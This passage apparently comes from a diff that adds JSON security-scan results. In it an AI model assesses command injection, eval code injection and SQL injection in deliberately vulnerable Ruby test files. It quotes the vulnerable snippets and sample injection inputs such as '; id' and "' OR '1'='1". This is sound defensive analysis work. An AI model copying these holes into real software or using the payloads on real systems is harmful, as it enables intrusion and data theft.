+            "rationale": "app/vuln_cmd.rb:3 is `system(\"ls \" + params[:dir])`. Verified by direct source read (the scanner's unverified-excerpt caveat is resolved; contents match the reported snippet exactly). Ruby's Kernel#system documentation confirms a single String first argument containing shell metacharacters is passed to a shell as command_line, so `params[:dir]` is interpreted by /bin/sh. Attacker input such as `; id` or `$(...)` therefore yields arbitrary command execution as the Rails process user. No validation, allowlist, sanitization, or Shellwords escaping is present anywhere in the file. The sibling app/safe_cmd.rb uses the multi-argument form `system(\"ls\", \"-la\")`, which bypasses the shell, confirming the intended vulnerable/safe contrast. Corroborated by two independent native-hunt observations on the same sink. Confidence held below 1.0 because neither Semgrep nor CodeQL was available to corroborate taint independently, and the snapshot contains no routes file, no ApplicationController, and no auth configuration, so action reachability and pre-auth status are unverified.",
+            "evidence_refs": [
+              "model-1eae62911d192eb8-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-1eae62911d192eb8",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:55:32.964575Z",
+            "metadata": {
+              "tool_calls_made": 12,
+              "total_tokens": 48432,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-1a49f19ddea57d2b",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "1a49f19ddea57d2b0949025dfe332005a32b9e81a95b8c8ca209806b0d239832",
+      "title": "Code injection via eval on untrusted input",
+      "description": "Vulnerable counterpart to a safe evaluation path: eval receives user-supplied string, which executes arbitrary Ruby in the process (file reads, shell commands, network access). Contents not inspected this turn; line is the file's first line.",
+      "cwe_category": "CWE-95",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-1a49f19ddea57d2b-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-95",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "Vulnerable counterpart to a safe evaluation path: eval receives user-supplied string, which executes arbitrary Ruby in the process (file reads, shell commands, network access). Contents not inspected this turn; line is the file's first line.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_eval.rb",
+            "language": "ruby",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_eval.rb (lines 1-5) ---\n1: class CalcController < ApplicationController\n2:   def compute\n3:     render plain: eval(params[:expr])\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.968370Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-1a49f19ddea57d2b-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.968370Z",
+      "updated_at": "2026-11-25T13:53:57.968370Z",
+      "metadata": {
+        "title": "Code injection via eval on untrusted input",
+        "rationale": "Vulnerable counterpart to a safe evaluation path: eval receives user-supplied string, which executes arbitrary Ruby in the process (file reads, shell commands, network access). Contents not inspected this turn; line is the file's first line.",
+        "evidence": "unknown (file listed by list_files; contents not inspected in this turn)",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-1a49f19ddea57d2b",
+          "finding_id": "model-1a49f19ddea57d2b",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-1a49f19ddea57d2b-model-1a49f19ddea57d2b-obs",
+            "ev-model-1a49f19ddea57d2b-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.924455Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-1a49f19ddea57d2b-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-1a49f19ddea57d2b-model-1a49f19ddea57d2b-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-1a49f19ddea57d2b-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-1a49f19ddea57d2b-ai",
+            "finding_id": "model-1a49f19ddea57d2b",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.5,
+            "assumptions": [
+              "CalcController#compute is reachable via an HTTP route; no routes file was available to confirm this, so an unreachable/dead-code outcome cannot be excluded from evidence.",
+              "Authentication and authorization on the endpoint are unknown; no filters or before_action declarations were observed in the snapshot.",
+              "The scanner's claim of a 'safe evaluation path' counterpart is unsupported: no safe_eval.rb exists among the snapshot files (only safe_cmd.rb, safe_json.rb, safe_sql.rb, safe_view.erb). The finding does not depend on that pairing.",
+              "The observation reported the sink at line 1; direct inspection places it at line 3. Substance is unaffected.",
+              "Scanner corroboration is absent, not negative: Semgrep and CodeQL were not installed and check_coverage for CWE-95 returned empty. Verification rests on manual source review of a 5-line file plus a repo-wide grep for eval/instance_eval/class_eval/send, which found no other dynamic-evaluation sinks.",
+              "Ruby version is unknown; $SAFE-based mitigations are removed in modern Ruby and are not relied upon either way."
+            ],
+            "rationale": "I have enough to assess. CodeQL and Semgrep aren't installed here, but the code is small and fully visible, so direct reading settles the flow.\n\n## Finding assessment: model-1a49f19ddea57d2b\n\n**Verdict: confirmed, as a code-level vulnerability.** The scanner's description is slightly off on provenance, but the sink is real and unambiguous.\n\n**Source code (complete file, 5 lines):**\n\n```ruby\nclass CalcController < ApplicationController\n  def compute\n    render plain: eval(params[:expr])\n  end\nend\n```\n\n**Flow:** `params[:expr]` (attacker-controlled request parameter) is passed directly to `Kernel#eval` with no validation, allowlisting, or sandboxing. The result is rendered back to the client, which also gives the attacker a read-out channel for the return value of their expression.\n\n**Why this is exploitable, not just theoretically bad:** Ruby's `eval` runs with the full privilege of the Rails process. An attacker-supplied string like a backtick or `system` call yields OS command execution, `File.read` yields arbitrary file disclosure (credentials, `config/master.key`, database config), and constant lookups reach loaded libraries and network sockets. There is no `$SAFE`/`RubyVM` guard here, and `$SAFE` is removed in modern Ruby anyway, so it would not have helped.\n\n**Two corrections to the scanner observation, neither of which changes the verdict:**\n- It says this is the \"vulnerable counterpart to a safe evaluation path.\" The sibling files in the snapshot are `safe_cmd.rb`, `safe_json.rb`, `safe_sql.rb`, `safe_view.erb` and their `vuln_*` counterparts. There is no `safe_eval.rb`, and no safe alternative for dynamic evaluation anywhere in the snapshot. The pairing claim is unsupported; the sink does not depend on it.\n- It reports the location as \"the file's first line\" and says contents were not inspected. I read the full file: the sink is at line 3, not line 1. The finding is correct on substance, imprecise on location.\n\n**Evidence gaps that matter:**\n- **Reachability",
+            "evidence_refs": [
+              "model-1a49f19ddea57d2b-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-1a49f19ddea57d2b",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:55:41.628281Z",
+            "metadata": {
+              "tool_calls_made": 13,
+              "total_tokens": 47440,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-c2b6b14f556a90d7",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "c2b6b14f556a90d7a43cb6942af2f36a0e150647435aa2b0ab654100298836e3",
+      "title": "SQL injection through string interpolation in query",
+      "description": "Vulnerable counterpart to safe_sql.rb: a SQL statement is built by interpolating request parameters rather than using bound placeholders, allowing tautologies and UNION/stacked statements to read or modify arbitrary rows. Contents not inspected this turn; line is the file's first line.",
+      "cwe_category": "CWE-89",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-c2b6b14f556a90d7-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-89",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "Vulnerable counterpart to safe_sql.rb: a SQL statement is built by interpolating request parameters rather than using bound placeholders, allowing tautologies and UNION/stacked statements to read or modify arbitrary rows. Contents not inspected this turn; line is the file's first line.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_sql.rb",
+            "language": "ruby",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_sql.rb (lines 1-5) ---\n1: class UsersController < ApplicationController\n2:   def show\n3:     @users = User.where(\"name = '#{params[:name]}'\")\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.969377Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-c2b6b14f556a90d7-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.969377Z",
+      "updated_at": "2026-11-25T13:53:57.969377Z",
+      "metadata": {
+        "title": "SQL injection through string interpolation in query",
+        "rationale": "Vulnerable counterpart to safe_sql.rb: a SQL statement is built by interpolating request parameters rather than using bound placeholders, allowing tautologies and UNION/stacked statements to read or modify arbitrary rows. Contents not inspected this turn; line is the file's first line.",
+        "evidence": "unknown (file listed by list_files; contents not inspected in this turn)",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-c2b6b14f556a90d7",
+          "finding_id": "model-c2b6b14f556a90d7",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-c2b6b14f556a90d7-model-c2b6b14f556a90d7-obs",
+            "ev-model-c2b6b14f556a90d7-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.924455Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-c2b6b14f556a90d7-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-c2b6b14f556a90d7-model-c2b6b14f556a90d7-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-c2b6b14f556a90d7-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-c2b6b14f556a90d7-ai",
+            "finding_id": "model-c2b6b14f556a90d7",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.5,
+            "assumptions": [
+              "UsersController#show is reachable over HTTP; no routes.rb exists in the snapshot, so routing was not verified (route lookup returned no mapping).",
+              "params[:name] is attacker-controlled and not filtered upstream; no before_action or input validation exists in the file read.",
+              "The 'users' table holds data an attacker should not read or modify; no schema or authorization layer was available to confirm.",
+              "Ruby is outside the seven supported language families, and Semgrep was unavailable on this host, so no independent static-analysis confirmation was obtained.",
+              "The overlapping finding model-ccb26c19b27f8e36 describes the same sink and should be de-duplicated."
+            ],
+            "rationale": "I confirmed the sink by reading the file directly. There's no routing, sanitizer, or schema file in the snapshot, so I'll note those as gaps.\n\n## Assessment: model-c2b6b14f556a90d7\n\n**Confirmed vulnerable.** `app/vuln_sql.rb` is a 5-line file I read in full:\n\n```ruby\nclass UsersController < ApplicationController\n  def show\n    @users = User.where(\"name = '#{params[:name]}'\")   # line 3\n  end\nend\n```\n\nLine 3 interpolates `params[:name]` into a single-quoted SQL string literal passed to `User.where`. In Rails, `where` with a String argument is treated as raw SQL, not as a parameterized condition, so no placeholder binding occurs and no escaping is applied to the interpolated value. The safe counterpart `app/safe_sql.rb` line 3 uses `User.where(name: params[:name])`, which is the hash form and does bind the value -- confirming the difference is exactly the interpolation, not the framework.\n\nExploitation reasoning from the code: an attacker-supplied `params[:name]` such as `' OR '1'='1` breaks out of the quote and turns the predicate into a tautology, returning all rows; `' UNION SELECT ... --` appends an arbitrary result set. This is a classic quote-breakout injection, so no special escaping or edge case is required.\n\n**Limitations of what I could verify this turn:**\n- `lookup_route` returned only a note that lookups are served from the scan manifest; it produced no mapping for `UsersController`. There is no `routes.rb` or `web.xml` in the snapshot (`grep_code` for `routes` found nothing). So I cannot prove the action is reachable over HTTP from this snapshot -- reachability is inferred from it being an ApplicationController action named `show` reading `params`.\n- Semgrep is not installed on this host (`semgrep not found on PATH`), and Ruby is not among the seven supported language families for CodeQL/Semgrep here. No independent static-analysis confirmation was possible; the finding rests on direct code reading plus the scanner's snippet, which matches what I read.\n-",
+            "evidence_refs": [
+              "model-c2b6b14f556a90d7-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-c2b6b14f556a90d7",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:55:50.921442Z",
+            "metadata": {
+              "tool_calls_made": 9,
+              "total_tokens": 43056,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    }
+  ],
+  "advisory_routing": {
+    "is_advisory_only": true,
+    "affects_finding_status": false,
+    "note": "Advisory recommendations never set or change a finding status; IndependentValidator remains the sole status owner.",
+    "route_counts": {},
+    "routed": 0,
+    "unavailable": 0,
+    "payloads": []
+  }
+}
